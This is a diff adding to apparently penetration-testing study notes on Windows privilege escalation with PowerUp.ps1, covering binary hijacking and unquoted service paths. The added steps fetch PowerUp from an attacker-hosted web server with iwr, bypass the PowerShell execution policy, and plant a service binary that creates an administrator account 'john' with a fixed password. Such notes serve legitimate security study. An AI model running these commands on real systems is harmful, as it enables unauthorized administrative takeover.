@@ -4,16 +4,47 @@ Before attempting to leverage the techniques laid out below the enumeration tact
 ## Automatic PrivEsc
 
 ### Binary Hijacking (PowerUp.ps1)
-Nb. This tool (like most) should not be trusted implicitly always and if it fails where enumeration suggests it ought to have succeeded then manual techniques should be employed.
+Nb. This tool (like most) should not be trusted implicitly always and if it fails where enumeration suggests it ought to have succeeded then manual techniques should be employed. By default on a successful exploit it will create an admin user with name `john` and password `Password123!`.
+
+Grab PowerUp:
 ```bash
 cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
 python3 -m http.server 80
 ```
+Load the Powershell module:
 ```powershell
 iwr -uri http://<our IP>/PowerUp.ps1 -Outfile PowerUp.ps1
 powershell -ep bypass
 . .\PowerUp.ps1
+```
+Identify the vulnerable binary:
+```powershell
+Get-ModifiableServiceFile
+```
+and exploit:
+```powershell
 Install-ServiceBinary -Name 'vulnerable-service'
+```
+
+### Unquoted Service Paths (PowerUp.ps1)
+Grab PowerUp:
+```bash
+cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
+python3 -m http.server 80
+```
+Load the Powershell module:
+```powershell
+iwr -uri http://<our IP>/PowerUp.ps1 -Outfile PowerUp.ps1
+powershell -ep bypass
+. .\PowerUp.ps1
+```
+Identify the vulnerable service:
+```powershell
+Get-UnquotedService
+```
+With the vulnerable service identified, feed forward the name and path:
+```powershell
+Write-ServiceBinary -Name 'VulnerableService' -Path "C:\Program Files\Dumb Apps\Tomfoolery.exe"
 ```
 
 ## Manual PrivEsc
